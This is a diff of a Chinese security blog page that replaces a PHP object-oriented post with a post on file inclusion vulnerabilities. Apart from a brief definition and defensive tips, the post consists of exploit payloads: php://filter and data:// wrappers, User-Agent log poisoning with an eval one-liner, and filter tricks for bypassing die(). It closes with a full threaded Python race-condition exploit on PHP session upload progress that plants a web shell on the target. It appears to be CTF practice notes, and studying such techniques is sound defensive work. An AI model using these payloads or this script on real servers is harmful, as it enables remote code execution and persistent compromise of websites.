@@ -4,8 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="PHP的面向对象, Robin">
-    <meta name="description" content="每日一记类与对象类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。对象 − 是类的实例。对象的主要三个特性：1.对象的行为：可以对对象施加那些操作，开灯，关灯就是行为。2.对象的形态：当施加那些方法是对象如何响应，">
+    <meta name="keywords" content="文件包含, Robin">
+    <meta name="description" content="概念文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 
+这种漏洞通常出现在应用程序中动态引用文件的代码中或是出现在用户可以控制文件名、文件路径或文件内容的输入参">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>PHP的面向对象 | Robin</title>
+    <title>文件包含 | Robin</title>
     <link rel="icon" type="image/png" href="../../../../favicon.png">
     
     <style>
@@ -343,12 +344,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">PHP的面向对象</h1>
+                    <h1 class="description center-align post-title">文件包含</h1>
                 </div>
             </div>
         </div>
@@ -395,28 +396,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-11-14
+                    2023-04-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-03
+                    2023-04-12
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.9k
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    5 分
                 </div>
                 
 
@@ -436,121 +437,109 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h4><p>类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。<br>对象 − 是类的实例。<br>对象的主要三个特性：<br>1.对象的行为：可以对对象施加那些操作，开灯，关灯就是行为。<br>2.对象的形态：当施加那些方法是对象如何响应，颜色，尺寸，外型。<br>3.对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。</p>
-<h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</p>
-<p>成员函数 − 定义在类的内部，可用于访问对象的数据。</p>
-<p>继承 − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p>
-<p>父类 − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</p>
-<p>子类 − 一个类继承其他类称为子类，也可称为派生类。</p>
-<p>多态 − 多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</p>
-<p>重载 − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</p>
-<p>抽象性 − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</p>
-<p>封装 − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</p>
-<p>构造函数 − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p>
-<p>析构函数 − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</p>
-<h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><pre><code>【定义函数】
-&lt;?php                                      //1.定义类
-class 类名 &#123;
-  /* 成员变量 */
-  var $var1;
-  var $var2 = &quot;constant string&quot;;
-  /* 成员函数 */
-  function 成员函数的函数名 ($arg1, $arg2) 
-  &#123;
-      return $this-&gt;函数 = 变量             //赋值并调用函数
-  &#125;
-&#125;
-?&gt;
-$对象名 = new 类名;                         //2.创建对象
-echo $对象名-&gt;成员函数(&quot;传入的参数&quot;);        //3.调用成员方法
-
-大括号&#123;&#125;内可以定义变量和方法
-变量使用 var 来声明, 变量也可以初始化值
-函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。
-变量 $this 代表自身的对象
+                <h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证<br>导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 </p>
+<p>这种漏洞通常出现在应用程序中动态引用文件的代码中<br>或是出现在用户可以控制文件名、文件路径或文件内容的输入参数上。<br>攻击者可以在这些参数中注入特定的字符，从而构造一个恶意文件路径并被应用程序读取<br>应用程序没有对这个路径进行验证，最终导致攻击者可以获取系统权限或读取任意文件。 </p>
+<p>在开发应用程序时，需要对文件路径进行验证<br>并遵循最小权限原则，确保应用程序具有最小的访问权限。<br>此外，使用白名单或安全沙箱技术也可以帮助防止文件包含漏洞的发生</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【使用伪协议读取文件】
+参数=php://filter/convert.base64-encode/resource=目标文件
+file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==    
+file=data://text/plain,&lt;?=`tac f*`;?&gt;
 
 
-【构造函数】
-在创建对象时， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。
-&lt;?php
-class 类名 &#123;
-   function __construct() &#123;
-       print &quot;构造函数&quot;;
-       $this-&gt;name = &quot;&quot;;
-   &#125;
-   function __destruct() &#123;
-       print &quot;销毁&quot; . $this-&gt;name . &quot;\n&quot;;
-   &#125;
-&#125;
-$obj = new 类名();
-?&gt;
+【UA注入后日志包含】
+user-ugent:
+&lt;?=eval($_POST[cmd]);?&gt;
+访问日志文件:
+?file=/var/log/nginx/access.log
+使用POST执行命令:
+cmd=system(“ls”);
+在UA中注入编码过的代码不会被浏览器解码
+GET请求的参数在存入PHP之前也不会被解码，但是日志在转发到PHO的端口之前就已经写入日志了。
 
-【继承】
-子类继承父类的特征和行为，使得子类对象具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为(父类=基类)
-&lt;?php 
-// 子类扩展站点类别
-class 类名 &#123;           //extends继承一个类
-   var $category;
-    function setCate($par)&#123;
-        $this-&gt;category = $par;
-    &#125;
-    function getCate()&#123;
-        echo $this-&gt;category . PHP_EOL;
-    &#125;
-&#125;
-注意:PHP 不支持多继承
 
-【方法重写】
-顾名思义重新定义function
+【session临时文件条件竞争】
+在.被过滤后php中唯一能无后缀控制的，只有session文件
+当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。一般的linux会将session保存在下面的的某一个目录下:
+     /var/lib/php/
+     /var/lib/php/sessions/
+     /tmp/
+     /tmp/sessions/
+web服务会使用多线程接收用户的请求，以确保能够处理并发进程或线程不同的程序段
+在多个并发请求时多个进程可能会同时创建同一个session文件
+那么攻击者就有可能在服务器创建session文件之前，先创建一个同名的session文件
+并利用PHP_SESSION_UPLOAD_PROGRESS设置文件内容，写入攻击者的命令
+如果成功存入了恶意文件，就能访问该文件并POST执行RCE
+EXP放在了文末
 
-【访问控制】
-PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有）
-protected(受保护的)只能被自身子父类访问
-private(私有的)只能被定义的类访问
-publice(公有的)可以在任何地方访问
-类属性必须被定义，var视为publice
 
-【接口】
-概念:指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。
-特性:通过interface定义，但是其中定义的所有方法都必须是公有而且要是空的。
-类可以实现多个接口，用逗号来分隔多个接口的名称。
-
-【常量】
-在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。
-常量的值必须是一个定值
-
-【接口与抽象类】
-1. 接口
-（1）对接口的使用是通过关键字implements
-（2）接口不能定义成员变量（包括类静态变量），能定义常量
-（3）子类必须实现接口定义的所有方法
-（4）接口只能定义不能实现该方法
-（5）接口没有构造函数
-（6）接口中的方法和实现它的类默认都是public类型的
-2. 抽象类
-（1）对抽象类的使用是通过关键字extends
-（2）不能被实例化，可以定义子类必须实现的方法
-（3）子类必须定义父类中的所有抽象方法，这些方法的访问控制必须和父类中一样（或者更为宽松）
-（4）如一个类中有一个抽象方法，则该类必须定义为抽象类
-（5）抽象类可以有构造函数
-（6）抽象类中的方法可以使用private,protected,public来修饰。
-（7）一个类可以同时实现多个接口，但一个类只能继承于一个抽象类。
-
-【关键字】
-1.Static
-(1)声明类属性或方法为 static(静态)，就可以不实例化类而直接访问
-(2)静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。
-(3)由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。
-(4)静态属性不可以由对象通过 -&gt; 操作符来访问。
-2.Final
-(1)如果父类中的方法被声明为 final，则子类无法覆盖该方法。
-(2)如果一个类被声明为 final，则不能被继承。
-
-【调用父类构造方法】
-PHP 不会在子类的构造方法中自动的调用父类的构造方法。
-要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() 
+【绕过die函数】
+思路:
+将die函数的代码语句编码成不能正常执行的命令，然后再将文件内的恶意代码编码成可执行命令。
+首先，base64加秘后会忽略掉一些符号以及中文字体
+(只有+, / , 0-9,a-z,A~Z,其余字符都会被跳过)
+又因为base64加密是4个一组，所以当你随意加上字符补齐die函数的编码时就能绕过die函数
+例如
+&quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;解码的内容其实只有phpdie，所以需要再填充两位
+另外，因为php://filter伪协议支持使用多个过滤器
+所以可使用strip_tags与base64解码的形式来实现绕过死亡代码
+例如
+?file=php://filter/string.strip_tags|convert.base64-decode/resource=4.php
+除此之外，可以通过使用rot13加密让php引擎把该代码识别成乱码
+例如
+&lt;?=system(&#39;tac f*.php&#39;);?&gt;  ————&gt;  &lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;
+&lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;  ————&gt;  &lt;?=system(&#39;tac f*.php&#39;);?&gt;
 </code></pre>
-<h4 id="面向对象暂时先写到这里，后面有新的认识再回来更改。"><a href="#面向对象暂时先写到这里，后面有新的认识再回来更改。" class="headerlink" title="面向对象暂时先写到这里，后面有新的认识再回来更改。"></a>面向对象暂时先写到这里，后面有新的认识再回来更改。</h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="当废话满天飞的时候，沉默是人类最大的贡献。"><a href="#当废话满天飞的时候，沉默是人类最大的贡献。" class="headerlink" title="当废话满天飞的时候，沉默是人类最大的贡献。"></a>当废话满天飞的时候，沉默是人类最大的贡献。</h5>
+<p>session文件条件竞争EXP</p>
+<pre><code>import requests
+import io
+import threading
+
+url = &#39;&#39;    # 改成自己的url
+sessionid = &#39;truthahn&#39;      # 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn
+cookies = &#123;
+            &#39;PHPSESSID&#39;:sessionid
+        &#125;
+
+def write(session):        # write()函数用于写入session临时文件
+    fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)    # 设置上传文件的大小为50k
+    data2 = &#123;
+        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?=eval($_POST[1])?&gt;&#39;    # 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话
+    &#125;
+    files = &#123;
+        &#39;file&#39;:(&#39;truthahn.jpg&#39;,fileBytes)
+    &#125;
+    while True:    
+        res = session.post(url,data=data2,cookies=cookies,files=files)
+        # print(res.text)
+        #print(&#39;======= write done! ======&#39;)
+
+def read(session):         # read()函数利用session临时文件生成一句话木马，实现rce
+    data1 = &#123;
+        &quot;1&quot;:&quot;file_put_contents(&#39;/var/www/html/3.php&#39;,&#39;&lt;?=eval($_POST[2]);?&gt;&#39;);&quot;     # 使用file_put_contents()php内置函数生成名为3.php的shell文件
+    &#125;
+    while True:
+        res = session.post(url+&#39;?file=/tmp/sess_&#39;+sessionid,data=data1,cookies=cookies)
+        # print(res.text)
+        res2 = session.get(url+&#39;3.php&#39;)
+        # print(res2.text)
+        if res2.status_code == 200:     #若3.php成功生成，则返回Done!，否则返回失败的状态码
+            print(&#39;++++++++ Done! +++++++++&#39;)
+        else:
+            print(res2.status_code)
+
+if __name__ == &#39;__main__&#39;:
+    event = threading.Event()       
+    with requests.session() as session:     # 为每个函数设置5个线程并发执行，可以适当增加以应对系统执行的系统时间
+        for i in range(5):
+            #print(&#39;*&#39;*50)
+            threading.Thread(target=write,args=(session,)).start()
+        for i in range(5):
+            #print(&#39;=&#39;*50)
+            threading.Thread(target=read,args=(session,)).start()
+
+    event.set()
+</code></pre>
+
                 
             </div>
             <hr/>
@@ -644,17 +633,18 @@ PHP 不会在子类的构造方法中自动的调用父类的构造方法。
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="../../15/%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8/">
+                <a href="">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/22.jpg" class="responsive-img" alt="元字符表">
+                        <img src="../../../../medias/featureimages/13.jpg" class="responsive-img" alt="文件包含">
                         
-                        <span class="card-title">元字符表</span>
+                        <span class="card-title">文件包含</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -664,26 +654,27 @@ PHP 不会在子类的构造方法中自动的调用父类的构造方法。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="../../../../categories/%E9%99%84%E5%BD%95/" class="post-category">
-                                    附录
+                            <a href="../../../../categories/%E6%97%A5%E6%8A%A5/" class="post-category">
+                                    日报
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="../../../../tags/%E9%99%84%E5%BD%95/">
-                        <span class="chip bg-color">附录</span>
+                    <a href="../../../../tags/%E6%97%A5%E6%8A%A5/">
+                        <span class="chip bg-color">日报</span>
                     </a>
                     
                 </div>
@@ -697,13 +688,13 @@ PHP 不会在子类的构造方法中自动的调用父类的构造方法。
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="../../13/20221113/">
+                <a href="../../08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/2.jpg" class="responsive-img" alt="PHP的常见字符操作函数">
+                        <img src="../../../../medias/featureimages/4.jpg" class="responsive-img" alt="命令执行">
                         
-                        <span class="card-title">PHP的常见字符操作函数</span>
+                        <span class="card-title">命令执行</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -714,7 +705,7 @@ PHP 不会在子类的构造方法中自动的调用父类的构造方法。
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-08
                             </span>
                         <span class="publish-author">
                             
